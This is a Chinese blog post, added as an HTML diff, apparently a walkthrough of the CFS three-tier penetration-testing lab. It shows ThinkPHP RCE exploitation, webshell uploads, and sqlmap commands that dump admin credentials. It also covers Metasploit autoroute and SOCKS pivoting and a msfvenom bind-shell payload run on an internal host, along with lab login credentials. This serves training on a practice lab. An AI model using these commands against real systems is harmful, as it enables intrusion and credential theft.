@@ -1,0 +1,473 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CFS三层靶机内网渗透 | 风清竹喧</title><meta name="keywords" content="渗透测试,靶机"><meta name="author" content="cgrona"><meta name="copyright" content="cgrona"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、靶场环境这个环境是由三台机器组成的一个内网，网络拓扑图如下  渗透的大致流程：攻击机和Target1位于同一网段，因此先把Target1拿下，然后以Target1为跳板，攻击内网中的Target2，然后同理以Target2为跳板攻击Target3。 注意：Target2和Target3位于内网中，彼此可以通信，但是无法连接外网 二、环境搭建1、网卡配置该环境需要由三块网卡搭建，编辑VMware">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CFS三层靶机内网渗透">
+<meta property="og:url" content="https://cgrona.top/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:site_name" content="风清竹喧">
+<meta property="og:description" content="一、靶场环境这个环境是由三台机器组成的一个内网，网络拓扑图如下  渗透的大致流程：攻击机和Target1位于同一网段，因此先把Target1拿下，然后以Target1为跳板，攻击内网中的Target2，然后同理以Target2为跳板攻击Target3。 注意：Target2和Target3位于内网中，彼此可以通信，但是无法连接外网 二、环境搭建1、网卡配置该环境需要由三块网卡搭建，编辑VMware">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.cgrona.top/Blog_img/30.jpg">
+<meta property="article:published_time" content="2023-02-27T06:03:14.000Z">
+<meta property="article:modified_time" content="2023-02-27T06:05:27.016Z">
+<meta property="article:author" content="cgrona">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.cgrona.top/Blog_img/30.jpg"><link rel="shortcut icon" href="/img/logo.jpg"><link rel="canonical" href="https://cgrona.top/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CFS三层靶机内网渗透',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-27 14:05:27'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="风清竹喧" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.cgrona.top/Blog_img/30.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">风清竹喧</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CFS三层靶机内网渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-27T06:03:14.000Z" title="发表于 2023-02-27 14:03:14">2023-02-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-27T06:05:27.016Z" title="更新于 2023-02-27 14:05:27">2023-02-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%90%9E%E6%B8%97%E9%80%8F/">搞渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CFS三层靶机内网渗透"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、靶场环境"><a href="#一、靶场环境" class="headerlink" title="一、靶场环境"></a>一、靶场环境</h1><p>这个环境是由三台机器组成的一个内网，网络拓扑图如下</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/拓扑.png" alt></p>
+<p>渗透的大致流程：攻击机和Target1位于同一网段，因此先把Target1拿下，然后以Target1为跳板，攻击内网中的Target2，然后同理以Target2为跳板攻击Target3。</p>
+<p>注意：Target2和Target3位于内网中，彼此可以通信，但是无法连接外网</p>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="1、网卡配置"><a href="#1、网卡配置" class="headerlink" title="1、网卡配置"></a>1、网卡配置</h2><p>该环境需要由三块网卡搭建，编辑VMware的虚拟网络编辑器，网卡不够可以添加，在这我使用的是VM0、VM2、VM3，然后设置和下图一样：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/网络.png" alt></p>
+<p>然后是配置网卡给攻击机和三个靶机</p>
+<p>攻击机kali：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/kali.png" alt></p>
+<p>配置好后查看一下IP看是否在正确的网段、并记录一下信息</p>
+<blockquote>
+<p>kali攻击机</p>
+<p>ip：192.168.31.187</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/kaliIP.png" alt></p>
+<p>然后是Target1：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t1.png" alt></p>
+<p>配置好后也可以用作者给的登录密码登录进去查看一下IP</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t1_.png" alt></p>
+<p>记录相关信息</p>
+<blockquote>
+<p>Target1</p>
+<p>登陆账号密码：root/teamssix.com</p>
+<p>ip1: 192.168.31.12</p>
+<p>ip2: 192.168.22.136</p>
+<p>宝塔登陆地址和密码：</p>
+<p>地址：<a target="_blank" rel="noopener" href="http://192.168.31.12:8888/a768f109">http://192.168.31.12:8888/a768f109</a></p>
+<p>账号：eaj3yhsl</p>
+<p>密码：41bb8fee</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t1IP.png" alt="Target1_ip"><strong>待改</strong></p>
+<p>同理，将Target2的网卡配置改为VM2和VM3，Target3的网卡为VM3</p>
+<p>然后查看一下IP是否正确</p>
+<blockquote>
+<p>Target 2</p>
+<p>登陆账号密码：root/teamssix.com</p>
+<p>ip1: 192.168.22.129</p>
+<p>ip2: 192.168.33.128</p>
+<p>宝塔登陆地址和密码</p>
+<p>地址：<a target="_blank" rel="noopener" href="http://192.168.22.129:8888/2cc52ec0">http://192.168.22.129:8888/2cc52ec0</a></p>
+<p>账号：xdynr37d</p>
+<p>密码：123qwe..</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t2IP.png" alt="Target2_ip"></p>
+<blockquote>
+<p>Target3</p>
+<p>登录密码：teamssix.com</p>
+<p>ip：192.168.33.33</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/t3IP.png" alt="Target3_ip"></p>
+<h2 id="2、宝塔配置"><a href="#2、宝塔配置" class="headerlink" title="2、宝塔配置"></a>2、宝塔配置</h2><p>首先打开Target1的宝塔地址，用给的账号密码登录进去</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt1.png" alt></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt1_1.png" alt></p>
+<p>同理，打开Target2的宝塔地址，但是因为Target2位于22网段，我们无法访问，因此我们可以给Target2添加多一个网卡VM0，以便我们配环境</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt2_0.png" alt></p>
+<p>然后用这个新网卡的IP去访问这个宝塔地址：<a target="_blank" rel="noopener" href="http://192.168.31.9:8888/2cc52ec0">http://192.168.31.9:8888/2cc52ec0</a></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt2_1.png" alt></p>
+<p>然后设置好</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/bt2_2.png" alt></p>
+<p>然后把刚才给Target2添加的网卡删除即可</p>
+<h1 id="三、Target1"><a href="#三、Target1" class="headerlink" title="三、Target1"></a>三、Target1</h1><p>主机探活：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br><span class="line">或</span><br><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_1.png" alt></p>
+<p>查看端口开放情况：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -Pn 192.168.31.12</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_2.png" alt></p>
+<p>访问一下80端口，很明显是ThinkPHP 5.x 框架</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_3.png" alt></p>
+<p>拿出专用工具扫描一下，发现存在RCE</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_4.png" alt></p>
+<p>传马、然后蚁剑连上</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_5.png" alt></p>
+<p>随便翻下目录，发现在robots.txt、flag21sA.txt中存在flag</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_6.png" alt></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_7.png" alt></p>
+<p>然后先反弹一下shell吧，可以通过msfvenom生成Linux马，然后上传再连就行。</p>
+<p>我这里就直接通过metaploit里面的模块直接对它进行攻击</p>
+<p>进入msf，找到ThinkPHP的漏洞利用模块</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_8.png" alt></p>
+<p>设置好相关信息即可拿到shell</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_9.png" alt></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_10.png" alt></p>
+<p>拿到shell的第一时间是提权，于是我去尝试了一些提权的方法，但并没有成功。</p>
+<p>信息收集时查看IP或者网络接口情况，发现存在22网段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+<p>但是kali在31网段，无法进行通信。为了让我们的kali能和22网段的计算机进行通信，就要使用<strong>Socks</strong>代理服务。</p>
+<blockquote>
+<p>Socks是一种代理服务，可以简单地将一端的系统连接到另外一端。支持多种协议，包括http、ftp请求及其它类型的请求。</p>
+<p>Socks在渗透测试中能够很方便的让我们与目标内网计算机之间通信。</p>
+</blockquote>
+<p>因为要访问到22网段，首先添加路由，也就是开路</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_14.png" alt></p>
+<p>然后把当前session挂起，然后调用socks代理模块，可以查看一下配置，缺什么就加什么</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 0.0.0.0</span><br><span class="line">set SRVPORT 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_15.png" alt></p>
+<p>开启了socks代理后，Linux中有个自带的工具可以利用本地的代理接口进行访问，就是proxychains</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+<p>把最下面的ip改成本机ip（kali）以及刚刚设置的端口号</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_16.png" alt></p>
+<p>然后在kali中要访问22网段或者用工具对22网段进行探测时，前面都要加上proxychains</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：proxychains nmap 192.168.22.129</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>但是不能通过<code>proxychains nmap -sP 192.168.22.0/24</code>这种命令来找存活主机，因为这是通过ping扫来发现主机，但走代理的两台主机是无法ping通的</p>
+</blockquote>
+<p>那我们如何找到22网段下的存活主机呢？因为Target1有一个22网段的网卡，因此它能够和22网段的主机通信、也就是能互相ping，因此我们在这台主机上写入一个sh文件：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_11.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=255;i++)); </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="comment">#PING并保留丢包数</span></span><br><span class="line">        p=`ping -c 1 192.168.31.<span class="variable">$i</span>|grep loss|awk <span class="string">&#x27;&#123;print $6&#125;&#x27;</span>|awk -F <span class="string">&quot;%&quot;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">            <span class="comment">#因为只PING一次，丢包数为0则表示成功，否则失败</span></span><br><span class="line">            <span class="keyword">if</span> [ <span class="variable">$p</span> -eq 0 ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;192.168.22.<span class="variable">$&#123;i&#125;</span>|true&quot;</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;192.168.22.<span class="variable">$&#123;i&#125;</span>|fail&quot;</span></span><br><span class="line">	    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>添加权限：<code>chmod 777 ping.sh</code></p>
+<p>然后运行shell脚本即可</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_12.png" alt></p>
+<p>成功找到存活主机：</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/ping.png" alt></p>
+<p>然后就可以开始信息收集了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.22.129</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意：这里必须加上Pn参数，也就是禁止ping扫，默认该主机存活；</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果没加上这个参数那么nmap就只会返回该主机不存活</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_17.png" alt></p>
+<p>然后如果想要在浏览器上也访问的话，只需要在浏览器上设置一下代理即可</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/3_13.png" alt></p>
+<p>上面是在Linux中的情况，如果想用Windows 也就是我们的物理机访问到22网段的话，可以借助一个软件：SocksCap64</p>
+<p>点开代理</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/sockscap1.png" alt></p>
+<p>添加代理</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/sockscap2.png" alt></p>
+<p>最后在这里加入想要访问的浏览器，以及要使用的工具即可</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/sockscap3.png" alt></p>
+<h1 id="四、Target2"><a href="#四、Target2" class="headerlink" title="四、Target2"></a>四、Target2</h1><p>开放了80端口，访问一下</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_1.png" alt></p>
+<p>发现是一个CMS的官网，指纹识别也没找到有用信息，信息收集一下发现robots.txt中存在一个路径</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_2.png" alt></p>
+<p>以及在查看源代码时发现了hint</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_3.png" alt></p>
+<p>先访问一下这个路径，虽然猜也猜得出是一个后台登录界面</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_4.png" alt></p>
+<p>那么思路就清楚了，首先通过SQL注入得到管理员账号密码，然后就可以登录后台了</p>
+<p>sqlmap开跑</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p &quot;keyword&quot; --dbs</span><br><span class="line">proxychains sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p &quot;keyword&quot; -D &quot;bagecms&quot; --tables</span><br><span class="line">proxychains sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p &quot;keyword&quot; -D &quot;bagecms&quot; -T &quot;bage_admin&quot; --columns</span><br><span class="line">proxychains sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p &quot;keyword&quot; -D &quot;bagecms&quot; -T &quot;bage_admin&quot; -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
+<p>成功得到账号密码：</p>
+<blockquote>
+<p>admin / 123qwe</p>
+</blockquote>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_5.png" alt></p>
+<p>登录进来后即可看到flag</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_6.png" alt></p>
+<p>然后随便翻翻发现在模板这里可以编辑php文件，那就写入木马然后蚁剑连接</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_7.png" alt></p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_8.png" alt></p>
+<p>找到木马所在的URL</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_9.png" alt></p>
+<p>成功连接</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_10.png" alt></p>
+<p>然后就是和Target1一样的思路，添加33网段的路由，但这个操作要在msf中执行，因此先反弹shell。</p>
+<p>因为该主机位于22网段、是无法访问外网的，因此让它主动连接我们是走不通的、只能通过正向连接。</p>
+<p>生成Linux木马：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp lport=3333 -f elf -o shell.elf</span><br><span class="line"><span class="comment"># bind_tcp是正向连接</span></span><br><span class="line"><span class="comment"># 注意是x64，可以通过简单的信息收集知道</span></span><br></pre></td></tr></table></figure>
+<p>msf开启监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.22.129</span><br><span class="line"><span class="built_in">set</span> LPORT 3333</span><br></pre></td></tr></table></figure>
+<p>在蚁剑中把该文件上传</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_11.png" alt></p>
+<p>蚁剑中打开终端，给该文件增加权限，然后运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>
+<p>成功连接</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/4_12.png" alt></p>
+<p>同样的、信息收集、查看网络，发现还有一个33网段，那么继续添加路由</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">run autoroute -s 192.168.33.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+<p>然后通过之前的ping.sh来发现33网段的存活主机</p>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/ping2.png" alt></p>
+<h1 id="五、Target3"><a href="#五、Target3" class="headerlink" title="五、Target3"></a>五、Target3</h1><p>信息收集，找到开放端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.33.33</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/5_1.png" alt>（)</p>
